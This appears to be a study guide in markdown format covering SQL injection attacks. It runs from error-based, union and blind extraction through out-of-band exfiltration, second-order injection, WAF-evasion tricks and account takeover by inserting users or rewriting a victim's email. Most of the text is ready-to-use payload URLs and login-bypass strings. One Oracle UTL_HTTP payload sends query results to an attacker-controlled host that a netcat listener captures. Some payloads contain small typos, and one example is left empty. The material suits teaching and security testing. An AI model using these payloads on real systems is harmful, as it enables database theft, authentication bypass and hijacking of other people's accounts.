# 🚀 Launch SQL Injection Attacks
Once information gathering and vulnerability detection have been performed, the attacker tries to perform different types of SQL injection attacks such as error-based SQL injection, union-based SQL injection, blind SQL injection, and so on.

## Perform Error Based SQL Injection 
An attacker uses the database-level error messages disclosed by an application to build a vulnerability exploit request. It is also possible to create automated exploits depending on the error messages generated by the database server. 
- **Extract Database Name** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(DB_NAME))--
  ```
  Syntax error converting the nvarchar value `'[DB NAME]'` into a column of data type int. 

- **Extract 1st Database Table** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--
  ```
  Syntax error converting the nvarchar value `'[TABLE NAME 1]'` into a column of data type int.

- **Extract 1st Table Column Name** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--
  ```
  Syntax error converting the nvarchar value `'[COLUMN NAME 1]'` into a column of data type int.

- **Extract 1st Field of 1st Row (Data)** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--
  ```
  Syntax error converting the nvarchar value `'[FIELD 1 VALUE]'` into a column of data type int.

## Perform Error Based SQL Injection using Stored Procedure Injection 
Stored procedure injection is a form of SQL injection that targets stored procedures when they use dynamic SQL statements and fail to validate user input. Stored procedures are designed to perform specific tasks in a database, but when developers concatenate user input directly into SQL strings, it creates a serious security risk. Attackers can manipulate this input to alter the behavior of the query and execute unauthorized commands.

For example, in the stored procedure:
```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)  
As  
Declare @sqlstring varchar(250)  
Set @sqlstring = 'Select 1 from users Where username = ' + @username + ' and passwd = ' + @passwd  
exec(@sqlstring)  
Go
```
If a user enters `anyusername or 1=1'` as the username and `anypassword` as the password, the injected condition `or 1=1` always evaluates to true. This forces the query to return a valid record, effectively bypassing authentication and granting access without valid credentials.

Another example is the stored procedure:
```sql
Create procedure get_report @columnamelist varchar(7900)  
As  
Declare @sqlstring varchar(8000)  
Set @sqlstring = 'Select ' + @columnamelist + ' from ReportTable'  
exec(@sqlstring)  
Go
```
Here, if the input is `1 from users; update users set password = 'password'; select *`, the procedure not only runs the report but also executes an `update` command that changes all user passwords in the database. This shows how attackers can chain malicious commands to manipulate data or compromise the system.

These examples highlight that improper input validation in stored procedures can lead to error-based SQL injection attacks, allowing attackers to bypass authentication, modify sensitive data, or even take full control of the database. Proper input sanitization, parameterized queries, and avoiding dynamic SQL inside stored procedures are essential defenses against such attacks.

## Perform Union SQL Injection 
Union SQL injection is an attack where the UNION clause is used to merge a malicious query with the original one, allowing attackers to extract data from the database. For example, if a parameter in a URL like
```pgsql
site.com/index.php?id=1'
```
returns a MySQL error, it indicates possible vulnerability. The attacker may then use:
```pgsql
site.com/index.php?id=1 ORDER BY 3--
```
to check how many columns exist. Once identified, they can inject a payload such as:
```pgsql
site.com/index.php?id=1 UNION ALL SELECT 1,2,3--
```
and replace the numbers with sensitive data fields to retrieve information from the database.

- **Extract Database Name** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,DB_NAME,3,4--
  ```
  `[DB_NAME]` Returned from the server

- **Extract Database Tables** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--
  ```
  `[EMPLOYEE_TABLE]` Returned from the server

- **Extract Table Column Names** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns where table_name ='EMPLOYEE_TABLE'--
  ```
  `[EMPLOYEE_NAME]`

- **Extract 1st Field Data** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME --
  ```
  `[FIELD 1 VALUE]` Returned from the server

## Bypass Website Logins Using SQL Injection 
Bypassing website logins with SQL injection happens when attackers insert malicious SQL commands into a login form to trick the application into granting access without valid credentials. This works because the application directly combines user input with SQL queries, allowing attackers to bypass authentication and run arbitrary commands on the backend database, leading to full exploitation of SQL vulnerabilities.

Try these at website login forms:
```sql
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```
**Example-1** <br>
  Login as a different user:
  ```sql
  ' UNION SELECT 1,'anotheruser','doesnt matter‘, 1--
  ```
**Example-2** <br>
  Bypassing login with MD5 involves exploiting weak SQL query handling. Instead of using the real database password hash, an attacker can inject a query that forces the application to accept a known MD5 hash. For example, using the input:
  ```sql
  Username: admin  
  Password: 1234' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
  ```

## Perform Blind SQL Injection – Boolean Exploitation (MySQL) 
SQL injection exploitation depends on the language used in SQL. Blind SQL Injection using Boolean exploitation happens when attackers send queries that return results based on true or false conditions, without directly showing data. In MySQL, attackers may use techniques like the UNION operator or conditional statements to test how the application responds. By carefully analyzing these responses, they can extract information from the database step by step, even when no direct error messages or outputs are shown.

For example, consider the query:
```sql
/?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),1,1))=97,555,777)
```
Here, the attacker is checking if the first character of the first password entry in the “users” table has an ASCII value of 97 (which is the letter **“a”**). If this condition is true, the query will return a valid result (TRUE), otherwise it will return FALSE. By repeating this process with different ASCII values, the attacker can determine the exact character.

Similarly, for the second character, the query becomes:
```sql
/?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),2,1))=97,555,777)
```
This checks if the second character of the password is “a.” By continuing this process for each position in the string, the attacker can fully reconstruct the password.

This method highlights the danger of blind SQL injection: even without direct error messages or query output, attackers can systematically extract sensitive data like usernames, passwords, or other critical information simply by analyzing true/false responses from the database. Proper input validation, parameterized queries, and secure coding practices are essential to prevent such exploitation.

## Blind SQL Injection—Extract Database Name 
Blind SQL injection allows attackers to extract database details without directly seeing the results. Using a time-based method, the attacker sends queries that make the database delay its response depending on whether a guessed character is correct. For example, if the query delays 10 seconds, the guessed letter is correct; if it responds quickly, it is wrong. Repeating this process lets the attacker gradually reveal the database name.

- **Example 1: Check for Database Name Length and Name** <br>
  ```sql
  http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--

  ```
  Database Name = ABCD (Considering that the database returned true for the above statement)

- **Example 2: Extract 1st Database Table** <br>

## Exporting a Value with Regular Expression Attack 
A regular expression attack in SQL injection is used to extract sensitive data like passwords by matching patterns in database values. For example, if an attacker knows user details are stored in a `UserInfo` table, they can craft SQL queries with regex to check which characters match the hashed password format `[a-f0-9]`. By repeating this process, the attacker can gradually reconstruct the full hashed password and compromise user accounts.

In general, databases store hashed passwords generated from MD5 or SHA-1 algorithms. Hashed passwords contain only `[a-f0-9]` values. 

### Exporting a value in MySQL 
In MySQL, an attacker uses the following method to identify the first character of the password: <br>
Check if the 1st character in the password is between “a” and “f” 
```mysql
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-f]' AND ID=2)
```
If the above query returns `TRUE`, then check if the 1st character in the password is between “a” and “c” 
```mysql
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-c]' AND ID=2)
```
If the above query returns `FALSE`, the attacker infers that the first character is between “d” and “f” Check if the 1st character in the password is between “d” and “f” 
```mysql
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-f]' AND ID=2)
```
If the result of the above query is `TRUE`, then check if the 1st character in password is between “d” and “e” 
```mysql
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-e]' AND ID=2)
```
If the result of the query is TRUE, the attacker tests for “d” or “e” Check if the 1st character in the password is “d” 
```mysql
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d]' AND ID=2)
```
Assume that the above query returns `TRUE`. The attacker thus identifies the first character of the password as “d.” The attacker repeats the same process to identify the remaining characters of the password.

### Exporting a value in MSSQL
In MSSQL, attackers use the same method as that described above to identify the first character of the password. Now, we will see how the attacker identifies the second character of the password in MSSQL using the following method:
Check if the 2nd character in the password is between “a” and “f”
```sql
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2)
```
If the above query returns `FALSE`, the attacker tries values between “0” and “9”. Check if the 2nd character in the password is between “0” and “9”
```sql
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[0-9]%' AND ID=2)
```
If the above query returns `TRUE`, then check if the 2nd character in the password is between “0” and “4”
```sql
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[0-4]%' AND ID=2)
```
If the above query returns `FALSE`, the attacker infers that the second character is between “5” and “9” <br>
Check if the 2nd character in the password is between “5” and “9”
```sql
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[5-9]%' AND ID=2)
```
If the above query returns `TRUE`, then check if the 2nd character in the password is between “5” and “7”
```sql
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[5-7]%' AND ID=2)
```
If the above query returns `FALSE`, then the attacker infers that the second character is either “8” or “9” <br>
Check if the 2nd character in the password is “8”
```sql
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[8]%' AND ID=2)
```
If the above query returns `TRUE`, the attacker identifies the second character in the password as “8” The attacker repeats the same process to identify the remaining characters of the password. Once the attacker obtains the password, he/she logs on to the web application to perform various malicious activities.

## Perform Double Blind SQL Injection 
Double-blind SQL injection is a sophisticated type of SQL injection attack in which an attacker does not receive direct feedback from a web application to confirm whether the injection is successful. This makes it more challenging because attackers must rely on indirect indicators or side channels to infer the success of their attempts. 

### How Double-Blind SQL Injection Works
1. The attacker identifies an input field that is susceptible to SQL injection but does not provide direct feedback such as error messages or data from the database.
2. An attacker can construct SQL injection payloads that can manipulate a database and cause observable changes or effects within the application.
3. he attacker looks for indirect indicators of a successful injection. This could include changes in application behavior, differences in response times, or impacts on other database-dependent functionalities.
4. Techniques such as Boolean-based blind SQL injection and time-based blind SQL injections are commonly used in double-blind SQL injection attacks.

Double-blind SQL injection uses time delays to extract information when no direct error messages or output are visible. The attacker sends queries that force the database to pause, then measures the web server’s response time to guess data. For example:
```sql
/?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now())))
```
Here, if the first character of the password equals `a` (ASCII 97), the `benchmark()` function creates a delay. By observing the slowdown, the attacker confirms the guess. The `sleep()` function can also be used instead of `benchmark()` to achieve the same effect with less server resource usage. This technique allows attackers to reconstruct sensitive data step by step through timing analysis.

## Perform Blind SQL Injection Using Out-of-Band Exploitation Technique 
Blind SQL injection with out-of-band exploitation is used when direct results from the database cannot be seen. Instead, the attacker forces the database to send data to an external server they control.

For example, consider the query:
```sql
SELECT * FROM products WHERE id_product=$id_product
```
A normal request might be:
```sql
http://www.example.com/product.php?id=10
```
An attacker can change it to:
```sql
http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)--
```
Here, the Oracle function `UTL_HTTP.request` makes an HTTP request to the attacker’s server, adding the result of `SELECT user FROM DUAL` (like the username “SCOTT”) into the request. The attacker sets up a server or uses a tool like Netcat to capture this request:
```vbnet
/home/tester/nc –nLp 80
GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```
This way, the database leaks information (in this case, the username) to the attacker’s server, confirming the blind SQL injection.

## Exploiting Second-Order SQL Injection 
Second-order SQL injection happens when malicious input is stored in a database and later reused by the application in another query without proper validation. At first, the input looks harmless because output escaping prevents immediate execution, but when the stored value is used again, the hidden malicious query runs and compromises the system.

For example, an attacker signs up with the username:
```sql
test' --
```
This value is stored safely in the database. Later, when the application uses that username in another SQL query without parameterization, the injected part (`' --`) executes, breaking the query logic. This allows the attacker to read, modify, or delete data and, in some cases, execute commands on the server.

The sequence of actions performed in a second-order SQL injection attack is as follows:
- The attacker submits a crafted input in an HTTP request
- The application saves the input in the database to use it later and gives a response to the HTTP request
- Now, the attacker submits another request
- The web application processes the second request using the first input stored in the database and executes the SQL injection query
- The results of the query in response to the second request are returned to the attacker, if applicable

## Bypass Firewall to Perform SQL Injection
Bypassing the WAF using SQL injection vulnerability is a major threat, as it is capable of retrieving the whole database from the server. Attackers use the following methods to bypass the WAF. 

### Normalization Method 
Normalization in databases ensures structured representation, but if functional dependencies or configurations are weak, it can open the door to SQL injection. For example, a properly formed query like:
```sql
/?id=1+union+select+1,2,3/*
```
would normally be blocked by a Web Application Firewall (WAF). However, if the WAF is misconfigured, an attacker can bypass it using tricks like:
```sql
/?id=1/*union*/union/*select*/select+1,2,3/*
```
After processing, the query turns into:
```sql
SELECT * FROM TABLE WHERE ID =1 UNION SELECT 1,2,3--
```
This allows the attacker to inject malicious SQL despite the presence of a WAF.

### HPP Technique 
HTTP Parameter Pollution (HPP) is a technique where attackers inject extra parameters into a URL or form request to bypass security filters and change how the server processes input. For example, a normal malicious query like:
```sql
/?id=1;select+1,2,3+from+users+where+id=1--
```
may be blocked by a WAF. But using HPP, the attacker can split it into multiple parameters:
```sql
/?id=1;select+1&id=2,3+from+users+where+id=1--
```
The server then merges these parameters in a way that bypasses the WAF, allowing the attack to succeed.

### HPF technique 
HTTP Parameter Fragmentation (HPF) is a technique attackers use to split malicious SQL queries across multiple parameters in order to bypass web application firewalls (WAFs). Instead of sending the full payload in one parameter, the query is broken into fragments that look harmless individually but are combined by the vulnerable code during execution.

For example, if a WAF blocks:
```sql
/?a=1+union+select+1,2/*
```
an attacker can bypass it by splitting the query:
```sql
/?a=1+union/*&b=*/select+1,2
```
When processed by the application, it becomes:
```sql
SELECT * FROM table WHERE a=1 UNION/* AND b=*/SELECT 1,2
```
This shows how HPF can reconstruct a full SQL injection query while slipping past WAF filters.

### Blind SQL Injection 
Blind SQL injection is a type of attack where an attacker sends SQL queries that don’t directly show results but reveal information through true or false responses from the application. Instead of seeing data on the screen, attackers use logical conditions to guess database content step by step.

For example, a request like:
```sql
?id=1 OR 0x50=0x50
```
always returns true because `0x50=0x50` is correct. Similarly, a query such as:
```sql
?id=1 AND ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74
```
checks if the first letter of a user’s password matches a specific ASCII value. By repeating such requests, attackers can slowly extract sensitive data even without direct output. This makes blind SQL injection dangerous and effective for bypassing firewalls or weak protections.

Negation, inequality signs, and logical request
- `and 1`
- `and 1=1`
- `and 2<3`
- `and 'a'='a'`
- `and 'a'<>'b'`
- `and 3<=2`

### Signature Bypass 
Signature bypass is a technique where attackers modify the structure of SQL queries so that a Web Application Firewall (WAF) cannot recognize them as malicious. Since WAFs rely on detecting specific query patterns (signatures), small changes in syntax can trick them while still executing harmful commands on the database.

For example, a WAF might block a simple injection like:
```sql
/?id=1+union+(select+1,2+from+users)
```
But an attacker can alter it into variations such as:
```sql
/?id=1+union+(select+'xz'from+xxx)
/?id=(1)union(select(1),mid(hash,1,32)from(users))
/?id=1+union+(select'1',concat(login,hash)from+users)
/?id=(1)union(((((((select(1),hex(hash)from(users))))))))
/?id=xx(1)or(0x50=0x50)
```
Even though these look different, they still perform the same malicious operation, allowing attackers to extract sensitive data while avoiding detection.

### Buffer Overflow Method
An attacker can use the buffer overflow method to crash and bypass the firewall. As most firewalls are developed in C/C++, it is easy for the attacker to bypass the firewall. For example, consider the following URL on which the attacker is trying to perform an SQL injection attack to bypass the WAF:
```sql
http:// www.certifiedhacker.com//index.php?page_id=15+and+(select 1)=(Select 0xAA[..(add about 1200 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4....
```
The attacker can use the following query to test if the firewall can be crashed:
```sql
?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/ %0A/*nnaa*/+1,2,3,4...
```
If the attacker gets the 500 error message as the response, he/she can easily bypass the firewall using the buffer overflow method.

### CRLF Technique
Carriage return, line feed (CRLF) is a pair of ASCII codes, 13 and 10. In Windows, CRLF is used to indicate the end of a line in a text file (\r\n). Macintosh uses CR (\r) alone and UNIX uses LF(\n) alone. <br>
The attacker can use the CRLF technique to bypass the firewall. For example, the attacker uses the following URL to bypass the WAF: 
```sql
http://www.certifiedhacker.com/info.php?id=1+%0A%0Dunion%0A%0D+%0A%0 Dselect%0A%0D+1,2,3,4,5--
```

## Bypassing WAF using JSON-based SQL Injection Attack 
Bypassing a Web Application Firewall (WAF) with JSON-based SQL injection takes advantage of how some applications process JSON input. Normally, WAFs look for suspicious characters like `=`, `<`, or `>` to block SQL injection attempts. However, when an application accepts JSON data in a POST request without proper validation or sanitization, attackers can embed SQL payloads inside JSON keys or values, making them harder for the WAF to detect.

For example, if an application takes JSON input such as:
```json
{"user": "<username>' --","pass": "irrelevant"}
```
the server might construct the following SQL query:
```sql
SELECT * FROM users WHERE username = '<username>' --' AND password = 'irrelevant';
```
Here, the `--` comment symbol causes the password check to be ignored. As a result, the attacker can log in with just the username and completely bypass the password requirement.

In other cases, attackers may use JSON operators like `? "key"` to trick the application into executing arbitrary queries while avoiding common WAF signatures. This technique can allow them to log in as any user, including the administrator, or extract sensitive data from the database.

The danger lies in the fact that JSON-based SQL injection looks like legitimate JSON traffic, making it harder for traditional WAF rules to detect. Without strong input validation, parameterized queries, and proper sanitization, applications remain exposed to this form of attack.

## Perform SQL Injection to Insert a New User and Update Password 

### Inserting a New User using SQL Injection 
Inserting a new user through SQL injection happens when attackers manipulate a vulnerable query to add their own account into the database. For example, if the application runs:
```sql
SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com';
```
an attacker can inject:
```sql
SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com';  
INSERT INTO Users (Email_ID, User_Name, Password) VALUES ('Clark@mymail.com','Clark','MyPassword');--';
```
This adds a new user "Clark" with the attacker’s chosen credentials. Once created, the attacker can log in as this user and gain direct access to the application.

> **Note:** An attacker can perform this attack only if the victim has INSERT permission on the users table. If the users table is having dependencies, an attacker cannot add a new user to the database.

### Updating Password using SQL Injection
Updating password using SQL injection happens when an attacker exploits the “Forgot Password” feature to change the registered email address of a victim. By injecting malicious SQL commands, the attacker can replace the victim’s email with their own.

For example, if the database has Alice’s email as `Alice@xyz.com`, the attacker injects:
```sql
SELECT * FROM Users WHERE Email_ID='Alice@xyz.com';  
UPDATE Users SET Email_ID='Clark@mymail.com' WHERE Email_ID='Alice@xyz.com';
```
This updates Alice’s email to the attacker’s email. When the attacker clicks on “Forgot Password,” the reset link goes to them instead of Alice. The attacker resets the password, logs in as Alice, and gains full access to her account for malicious use.
